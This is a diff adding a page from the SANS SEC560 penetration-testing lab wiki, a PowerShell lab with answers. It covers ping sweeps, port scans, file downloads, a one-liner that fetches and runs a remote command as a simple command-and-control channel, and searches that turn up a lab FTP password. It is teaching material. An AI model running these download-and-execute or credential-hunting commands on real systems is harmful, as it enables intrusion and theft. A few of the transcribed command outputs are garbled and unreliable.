@@ -1,0 +1,380 @@
+<!DOCTYPE HTML>
+<!--
+    Editorial by HTML5 UP
+    html5up.net | @ajlkn
+    Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+
+    560 Wiki made with love and care by the following people:
+    - Tim Medin (@TimMedin, @RedSiegeInfoSec) -- Project Lead, Red Siege Information Security
+    - Erik Van Buggenhout (@@ErikVaBu, @NVISOsecurity) -- Project Lead, NVISO Security
+    - Mick Douglas (@BetterSafetyNet) -- Tech lead, Intern Wrangler, InfoSec Innovations
+        - Yulli Chong -- Intern, InfoSec Innovations
+        - Aaron Sawyer (@CrashingStatic) -- Intern, InfoSec Innovations
+-->
+<html>
+    <head>
+        <title>SANS SEC560 Lab Wiki</title>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+        <link rel="stylesheet" href="css/main.css" />
+    </head>
+    <body>
+
+        <!-- Wrapper -->
+            <div id="wrapper">
+
+                <!-- Main -->
+                    <div id="main">
+                        <div class="inner">
+
+                            <!-- Header -->
+                                <header id="header">
+                                    <a href="index.html" class="logo">SANS SEC 560 Lab Wiki</a>
+                                    <ul class="icons">
+                                        <li><a href="https://twitter.com/search?q=Sec560" class="icon fa-twitter"><span class="label">Twitter</span></a></li>
+                                    </ul>
+                                </header>
+
+                            <!-- Content -->
+                            <!-- Converted Markdown body (AKA HTML stubs) goes here -->
+<h1 id="lab-26-powershell-challenges">Lab 2.6: PowerShell Challenges</h1>
+<h2 id="objectives">Objectives</h2>
+<p>Next, let&rsquo;s perform a series of challenges based on techniques a penetration tester may apply, all from within PowerShell. PowerShell is an important skill for a penetration tester or frankly, a Windows power user.</p>
+<p>In particular, you&rsquo;ll do the following:</p>
+<h4 id="challenge-1-youll-use-powershells-built-in-capabilities-to-perform-a-ping-sweep-and-a-port-scan"><a href="#challenge1">Challenge 1</a>: You&rsquo;ll use PowerShell&rsquo;s built-in capabilities to perform a ping sweep and a port scan</h4>
+<h4 id="challenge-2-youll-move-a-file-from-your-linux-host-using-powershell-without-netcat"><a href="#challenge2">Challenge 2</a>: You&rsquo;ll move a file from your Linux host using Powershell without Netcat</h4>
+<h4 id="challenge-3-youll-search-through-wordpress-files-on-your-cwordpress-to-find-an-interesting-file-containing-a-password-with-bonus-challenge"><a href="#challenge3">Challenge 3</a>: You&rsquo;ll search through WordPress files on your (<code>C:\Wordpress</code>) to find an interesting file containing a password (With Bonus Challenge!)</h4>
+<p>As with other challenge-based labs in this class, we&rsquo;ve provided potential answers to each challenge. Look at these answers if you need ideas for how to solve each challenge. You can also refer back to the earlier pages of this course for inspiration in solving each challenge.</p>
+<p>Table of Contents</p>
+<ul>
+<li><a href="#walkthrough">Challenges and Answers</a>
+<ul>
+<li><a href="#challenge1">Challenge 1</a></li>
+<li><a href="#answer1">Answer 1</a></li>
+<li><a href="#challenge2">Challenge 2</a></li>
+<li><a href="#answer2">Answer 2</a></li>
+<li><a href="#challenge3">Challenge 3</a></li>
+<li><a href="#answer3">Answer 3</a></li>
+</ul></li>
+<li><a href="#conclusion">Conclusion</a></li>
+</ul>
+<p><a id="walkthrough">&nbsp;</a></p>
+<h2 id="lab---the-challenges-and-answers">Lab - The Challenges and Answers</h2>
+<p><a id="challenge1">&nbsp;</a></p>
+<h4 id="challenge-1-ping-sweep-and-port-scan">Challenge 1: Ping Sweep and Port Scan</h4>
+<p>For this challenge, we&rsquo;ll look at how we can scan a target environment from a single system we control, either because it is our testing system or because we've compromised it.</p>
+<p>Start by using PowerShell on your system to conduct a ping sweep of IP addresses <b>10.10.10.1-60</b>.</p>
+<blockquote>
+<p>As a hint, use ping with the <code>-w 100</code> option to make it wait only up to 100 milliseconds for a response. Otherwise, your sweep will take too long.</p>
+</blockquote>
+<blockquote>
+<p>As a second hint, in the body of your loop, <code>echo</code> the current address you are trying so you can get an indication of the status of your command. Then try to <code>ping</code> the target one time (<code>-n 1</code>) and look for the string ttl in your result.</p>
+</blockquote>
+<p>You should find that <b>10.10.10.5</b>, <b>10.10.10.10</b>, <b>10.10.10.20</b>, <b>10.10.10.50</b>, and <b>10.10.10.60</b> all respond to your pings.</p>
+<p>Next, using PowerShell, do a port scan of <b>10.10.10.50</b>, looking for open TCP ports in the range of 70 through 90. You should find that TCP port 80 is open on the target.</p>
+<p>Finally, given that TCP port 80 is open on <b>10.10.10.50</b>, use PowerShell's built-in capabilities to connect to that server using HTTP to retrieve a file, specifically the default webpage, storing its contents into local file <code>c:\file.html</code>. Then display the contents of that file on the screen. Finally, delete the files ... all in one PowerShell command line.</p>
+<blockquote>
+<p>As a hint, remember to separate your commands in a code block (<code>{ })</code> using a semicolon (<code>;</code>).</p>
+</blockquote>
+<blockquote>
+<p>As one final hint, look through the PowerShell help to see how to <code>del</code> (short for delete) a file, with <code>help del</code>.</p>
+</blockquote>
+<p><a id="answer1">&nbsp;</a></p>
+<h4 id="answer-1">Answer 1:</h4>
+<p>To start answering this challenge, we first do our <code>ping</code> sweep. We create a series of numbers from 1 through 60 (<code>1..60</code>). Then we pipe those numbers through a <code>ForEach-Object</code>. We display the number (<code>echo $_</code>) and then <code>ping</code> one time (<code>-n 1</code>), waiting no more than 100 milliseconds for a response (<code>-w 100</code>) of target IP address <code>10.10.10.$_</code> (which is the number we&rsquo;re trying to ping). We then scrape through the output of <code>ping</code> using the <code>Select-String</code> (<code>sls</code>) cmdlet to look for <code>ttl</code> in a case-insensitive fashion. Remember, when <code>ping</code> can successfully access a target, it prints out a message saying the ttl of the responses it receives. The resulting command is:</p>
+<pre>
+1..60 | % { echo $_; ping -n 1 -w 100 10.10.10.$_ | select-string ttl }
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex2.6_img06.png" style="width:100%;max-width:600px"  alt="Ping sweep" /></p>
+<pre>
+PS C:\Users\sec560> <b>1..60 | % {echo $_; ping -n 1 -w 100. 10.10.10.$_ | select-string ttl}</b>
+1
+2
+3
+a
+5
+6
+7
+8
+9
+10
+<em>Reply from 10.10.10.10: bytes=32 time=6ms TTL=128</em>
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+<em>Reply from 10.10.10.20: bytes=32 time=47ms TTL=128</em>
+</pre>
+
+<p>Next, to do our port scan, we start by creating the numbers 70 through 90 (<code>70..90</code>). We'll use this reduced set of ports for the sake of time. We then take each (<code>| %</code>) of those numbers (<code>$_</code>) and display the number on the screen (<code>echo $_</code>). We then echo to create a new object of a TCP client, connecting to 10.10.10.50 on TCP port <code>$_</code> (the current port number). If this fails, we throw our error message away (<code>2&gt;$null</code>). If it succeeds, we echo that the port (<code>$_</code>) is open.</p>
+<pre>
+70..90 | % {echo $_; echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.50", $_)) "Port $_ is open" } 2>$null</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex2.6_img07.png" style="width:100%;max-width:600px"  alt="PowerShell port scan" /></p>
+<pre>
+PS C:\Users\sec560> <b>70..90 | % {echo echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.50",$)) "Port $_ is open" } 2>null</b>
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+<em>Port 80 is open</em>
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+</pre>
+
+<p><a id="challenge2">&nbsp;</a></p>
+<h4 id="challenge-2-move-a-file-from-linux-using-only-powershell">Challenge 2: Move a File from Linux Using Only PowerShell</h4>
+<h5 id="part-a-invoke-webrequest">Part A: Invoke-WebRequest</h5>
+<p>The Linux server is running a web server. Use the <code>Invoke-WebRequest</code> cmdlet to copy the file from the URL below to your Windows host. This cmdlet is supported in Windows 8 (PowerShell v3) and later.</p>
+<pre>
+http://<i>YOUR_LINUX_IP_ADDRESS</i>/SEC560/netcat.zip
+</pre>
+
+<h5 id="part-b-systemwebwebclient">Part B: System.Web.WebClient</h5>
+<p>Windows 7 comes installed with PowerShell v2 installed by default, so the <code>Invoke-WebRequest</code> won't work. Run a PowerShell v2 command to move the same file. You'll need to use <code>System.Web.WebClient</code> as described in the course.</p>
+<h5 id="part-c-retrieve-a-command-and-execute-it">Part C: Retrieve a command and execute it</h5>
+<p>Create a file named <code>command.txt</code> on your Linux host in <code>/opt/course_www</code>. The file should contain a command to execute in PowerShell. Use PowerShell to grab the file contents and execute the command without saving the file to disk. An example command would be <code>whoami</code>. The file could look like this:</p>
+<pre>
+$ <b>cat /opt/course_www/command.txt</b>
+whoami
+</pre>
+
+<p>You'll need to examine the output object from <code>Invoke-WebRequest</code> to find the property you'll need.</p>
+<p><a id="answer2">&nbsp;</a></p>
+<h4 id="answer-2">Answer 2:</h4>
+<h5 id="part-a">Part A</h5>
+<p>To fetch a webpage from the Linux system, we could use the <code>Invoke-WebRequest</code> cmdlet (aliased as <code>wget</code>):</p>
+<pre>
+PS C:\> <b>Invoke-WebRequest http://<i>YOUR_LINUX_IP_ADDRESS</i>/SEC560/netcat.zip -outfile netcat.zip</b>
+</pre>
+
+<h5 id="part-b">Part B</h5>
+<p>Alternatively, on a Windows 7 machine, we could invoke the <code>New-Object</code> cmdlet to create a WebClient, calling its <code>.DownloadFile</code> method to grab the default page from the URL below, and store its results in <code>netcat.zip</code>.</p>
+<pre>
+http://<i>YOUR_LINUX_IP_ADDRESS</i>/SEC560/netcat.zip
+</pre>
+
+<p>Command:</p>
+<pre>
+PS C:\> <b>(New-Object System.Net.WebClient).DownloadFile("http://<i>YOUR_LINUX_IP_ADDRESS</i>/SEC560/netcat.zip","netcat.zip")</b>
+</pre>
+
+<h5 id="part-c">Part C</h5>
+<p>First, create the file in Linux. You will have to be root to save to this location.</p>
+<pre>
+$ <b>sudo su -</b>
+# <b>echo whoami > /opt/course_www/command.txt</b>
+# <b>cat /opt/course_www/command.txt</b>
+whoami
+</pre>
+
+<p>On Windows, you can use a command like this:</p>
+<pre>
+PS C:\> <b>Invoke-Expression (Invoke-WebRequest http://10.10.75.102/command.txt).Content</b>
+<em>sec560student\sec560</em>
+</pre>
+
+<p>As you can see in the output above, the output of the <code>whoami</code> command is printed after our command. This is useful for command and control (C2). Of course, our C2 is not very robust, but it demonstrates a common method of sending commands to a compromised host.</p>
+<p><a id="challenge3">&nbsp;</a></p>
+<h4 id="challenge-3-finding-interesting-files">Challenge 3: Finding Interesting Files</h4>
+<p>WordPress files copied from a compromised host have been copied back to your system and are located at <code>C:\wordpress</code>. Your goal is to find two passwords in the contents of the files. One is easy; the other is hard (unless you already know where to look)!</p>
+<p>Your challenge is to write a PowerShell command that can find this file in <code>C:\Wordpress</code> based on the pattern <code>*password*.txt</code> in the filename. You also want your command to display not only the filename but also its contents.</p>
+<p>As a hint, start by constructing a file search based on the name alone, without displaying the contents.</p>
+<p>Then pipe each discovered file object to something that can display its contents, using the <code>fullname</code> property.</p>
+<p><b>Bonus</b></p>
+<p>If you have extra time, as a bonus, instead of searching for a filename with the word <b>"password"</b> in it, recurse through all files inside of <code>C:\Wordpress</code> looking for files that <i>contain</i> the word <b>"password"</b>. As a hint, you may want to use <code>Select-String</code> to look inside file contents.</p>
+<p>Note that for this challenge, we are trying to model a situation where we have access to a compromised system, and we are going to look for passwords. One of the most common things you'll do in penetration testing is to find a password, use it, then repeat.</p>
+<p><a id="answer3">&nbsp;</a></p>
+<h4 id="answer-3">Answer 3:</h4>
+<p>Here is one possible solution to Challenge 3.</p>
+<p>Now we build up to our answer. We start with ls to find files using <code>-r</code> to recurse. We recurse through <code>C:\Wordpress</code>, looking for a file with a name of <code>*password*.txt</code>. We'll pipe the results into <code>Get-Content</code> to view the file. The <code>Get-Content</code> cmdlet understands the objects being passed down the pipeline, so it knows what file to view.</p>
+<pre>
+PS C:\> <b>ls -r C:\Wordpress *password*.txt</b>
+</pre>
+
+<p>But instead of just showing the file&rsquo;s name, we want to see its contents. We can do that by using the <code>Get-Content</code> cmdlet (alias <code>gc</code>):</p>
+<pre>
+PS C:\> <b>ls -r C:\Wordpress *password*.txt | gc</b>
+</pre>
+
+<p>However, our challenge asked us to display the name and the file contents, so we'll have to use the <code>ForEach-Object</code> cmdlet (alias <code>%</code>).</p>
+<pre>
+PS C:\> <b>ls -r C:\Wordpress *password*.txt | % { echo $_.fullname; gc $_.fullname }</b>
+</pre>
+
+<p>Your results should look like this:</p>
+<pre>
+PS C:\> <b>ls -r C:\Wordpress *password*.txt | % { echo $_.fullname; gc $_.fullname }</b>
+C:\wordpress\wp-content\uploads\password.txt
+FTP Credentials
+<em>username: root</em>
+<em>Password: describe-sun-shelter-whispered</em>
+</pre>
+
+<p>For your bonus challenge (where you search the contents of files looking for <b>"password"</b>), one possible solution is:</p>
+<pre>
+PS C:\> <b>ls -r C:\Wordpress | select-string -pattern password 2>$null</b>
+</pre>
+
+<p>In this command, as before, we run the <code>ls</code> alias to recurse (<code>-r</code>) through <code>C:\Wordpress</code>, looking for items. The <code>Select-String</code> cmdlet is aware of the objects passed down the pipeline and knows the file to search for our pattern. The pattern we are looking for is <code>password</code>. We throw away error messages to prevent the screen from getting cluttered (<code>2&gt;$null</code>).</p>
+<p>There will be a LOT of files in the output. Part of penetration testing is that of a file archaeologist.</p>
+<blockquote>
+<p>Hint 1: Adjust your <code>ls</code> to look for files with <code>*config*</code> in the name.</p>
+</blockquote>
+<p>The answer is not posted here. Good luck!</p>
+<p><a id="conclusion">&nbsp;</a></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>And that brings us to the conclusion for our PowerShell lab. In this lab, we&rsquo;ve used PowerShell for many tasks that a professional penetration tester (or real-world bad person) would apply during the post-exploitation phase. Namely, we&rsquo;ve searched for files containing potentially sensitive information, such as passwords; we&rsquo;ve created a backdoor service with <code>nc.exe</code> on a target machine and run it; and we&rsquo;ve used built-in capabilities to ping sweep, port scan, and fetch webpages from additional targets.</p>
+
+                        </div>
+                    </div>
+
+                <!-- Sidebar -->
+                    <div id="sidebar">
+                        <div class="inner">
+
+                            <!-- Search -->
+                            <!-- MBD 20180705 - Search feature is disabled for now.  Will enable it once we get OK
+                                <input type="text" name="query" id="query" placeholder="Search" />
+                                    <button onclick="myFunction()">?</button>
+                                        <script>
+                                        function myFunction() {
+                                                var x = document.getElementById("query").value;
+                                               var res =  idx.search(x);
+                                            alert(res);
+                                       </script>
+                            -->
+
+                            <!-- Menu -->
+                                <nav id="menu">
+                                    <header class="major">
+                                        <h2>Menu</h2>
+                                    </header>
+                                    <ul>
+                                        <li><a href="index.html">Homepage</a></li>
+                                        <li><a href="Getting-Started.html">Getting Started</a></li>
+                                        <li>
+                                            <span class="opener">Book 1:</span>
+                                            <ul>
+                                                <li><a href="Lab-1.1-Setting-Up-The-Image.html">Setting Up The Image</a></li>
+                                                <li><a href="Lab-1.2-Scope-and-RoE-Role-Play.html">Scope and RoE Role Play</a></li>
+                                                <li><a href="Lab-1.3-Metadata-Treasure-Hunt.html">Metadata Treasure Hunt</a></li>
+                                                <li><a href="Lab-1.4-Recon-ng-for-DNS-Analysis.html">Recon-ng for DNS Analysis</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 2:</span>
+                                            <ul>
+                                            	<li><a href="Lab-2.1-Nmap.html">Nmap</a></li>
+                                            	<li><a href="Lab-2.2-Nmap-O-sV.html">Nmap -O -sV</a></li>
+                                                <li><a href="Lab-2.3-NSE.html">NSE</a></li>
+                                                <li><a href="Lab-2.4-Nessus.html">Nessus</a></li>
+                                                <li><a href="Lab-2.5-Netcat.html">Netcat</a></li>
+                                                <li><a href="Lab-2.6-PowerShell.html">PowerShell</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 3:</span>
+                                            <ul>
+                                                <li><a href="Lab-3.1-Metasploit.html">Metasploit</a></li>
+                                                <li><a href="Lab-3.2-Meterpreter.html">Meterpreter</a></li>
+                                                <li><a href="Lab-3.3-Veil.html">Veil</a></li>
+                                                <li><a href="Lab-3.4-Port-Pivot-Relays.html">Port Pivot Relays</a></li>
+                                                <li><a href="Lab-3.5-Empire.html">Empire</a></li>
+                                                <li><a href="Lab-3.6-Running-Commands-with-sc-and-WMIC.html">Running Commands with sc and WMIC</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 4:</span>
+                                            <ul>
+                                                <li><a href="Lab-4.1-Hydra-Password-Guessing.html">Hydra Password Guessing</a></li>
+                                                <li><a href="Lab-4.2-MSF-psexec-hashdump-kiwi.html">MSF psexec, hash dumping, and Kiwi</a></li>
+                                                <li><a href="Lab-4.3-MSF-pivots.html">MSF Pivots</a></li>
+                                                <li><a href="Lab-4.4-Cracking-with-JtR-and-Hashcat.html">Cracking with John the Ripper and Hashcat</a></li>
+                                                <li><a href="Lab-4.5-Sniffing-Cracking.html">Sniffing & Cracking</a></li>
+                                                <li><a href="Lab-4.6-Pass-the-Hash.html">Pash the Hash</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 5:</span>
+                                            <ul>
+                                                <li><a href="Lab-5.1-Kerberos.html">Kerberos</a></li>
+                                                <li><a href="Lab-5.2-Responder.html">Responder</a></li>
+                                                <li><a href="Lab-5.3-Bloodhound.html">Bloodhound</a></li>
+                                                <li><a href="Lab-5.4-Privilege-Escalation.html">Privilege Escalation</a></li>
+                                                <li><a href="Lab-5.5-Domain-Dominance.html">Domain Dominance</a></li>
+                                                <li><a href="Lab-5.6-ZAP-Proxy.html">ZAP Proxy</a></li>
+                                                <li><a href="Lab-5.7-Command-Injection.html">Command Injection</a></li>
+                                                <li><a href="Lab-5.8-SQL-Injection.html">SQL Injection</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 6:</span>
+                                            <ul>
+                                                <li><a href="Lab-6.1a-Connecting-to-the-Network.html">Connecting to the Network</a></li>
+                                                <li><a href="Lab-6.1b-Online-CTF-Access.html">Online CTF Access</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Cheatsheets</span>
+                                            <ul>
+                                                <li><a href="other/MetsploitCheatsheet.pdf">Metasploit</a></li>
+                                                <li><a href="other/NetcatCheatSheetV1.pdf">Netcat</a></li>
+                                                <li><a href="other/WindowsCommandLineSheetV1.pdf">Windows Command Line</a></li>
+                                            </ul>
+                                        </li>
+                                    </ul>
+                                </nav>
+
+
+
+                            <!-- Footer -->
+                                <footer id="footer">
+                                    <p class="copyright">&copy; Tim Medin<br>
+                                        All rights reserved. <br>
+                                        Design: <a href="https://html5up.net">HTML5 UP</a>.</p>
+                                </footer>
+
+                        </div>
+                    </div>
+
+            </div>
+
+            <!-- The Modal -->
+            <div id="myModal" class="modal">
+                <span class="close">&times;</span>
+                <img class="modal-content" id="img01">
+                <div id="caption"></div>
+            </div>
+
+        <!-- Scripts -->
+            <script src="js/jquery.min.js"></script>
+            <script src="js/skel.min.js"></script>
+            <script src="js/util.js"></script>
+            <script src="js/main.js"></script>
+
+    </body>
+</html>
